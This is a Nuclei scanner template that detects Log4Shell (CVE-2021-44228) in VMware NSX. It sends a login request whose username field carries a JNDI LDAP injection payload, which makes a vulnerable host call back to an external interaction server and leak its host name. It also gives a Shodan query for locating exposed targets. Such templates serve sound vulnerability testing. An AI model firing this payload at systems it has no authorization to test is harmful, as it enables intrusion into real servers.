http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: location
    type: word
    words:
    - /login.jsp?login_error=1
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - '@timeout: 20s

    POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/login.jsp


    username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=

    '
id: vmware-nsx-log4j-rce
info:
  author: DhiyaneshDK
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: VMware NSX is susceptible to remote code execution via the Apache Log4j
    framework. An attacker can execute malware, obtain sensitive information, modify
    data, and/or gain full control over a compromised system without entering necessary
    credentials.
  metadata:
    max-request: 1
    shodan-query: html:"vmw_nsx_logo-black-triangle-500w.png"
    verified: true
  name: VMware NSX - Remote Code Execution (Apache Log4j)
  reference:
  - https://kb.vmware.com/s/article/87086
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
